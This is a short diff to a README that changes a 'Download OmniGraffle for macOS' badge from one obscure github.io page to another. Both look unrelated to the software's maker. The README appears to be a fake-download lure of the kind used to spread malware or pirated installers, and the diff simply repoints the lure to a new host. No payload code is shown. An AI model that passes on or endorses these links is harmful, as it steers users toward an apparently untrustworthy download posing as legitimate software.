@@ -4,7 +4,7 @@
 
 ## 📥 Download OmniGraffle for macOS
 
-[![⬇️ Download OmniGraffle Mac](https://img.shields.io/badge/Download-OmniGraffle%20Mac-blue?style=for-the-badge&logo=apple&logoColor=white)](https://shuziktobehuman.github.io/huja/OmniGraffle)
+[![⬇️ Download OmniGraffle Mac](https://img.shields.io/badge/Download-OmniGraffle%20Mac-blue?style=for-the-badge&logo=apple&logoColor=white)](https://mitrobandus.github.io/.github/OmniGraffle)
 
 ---
 
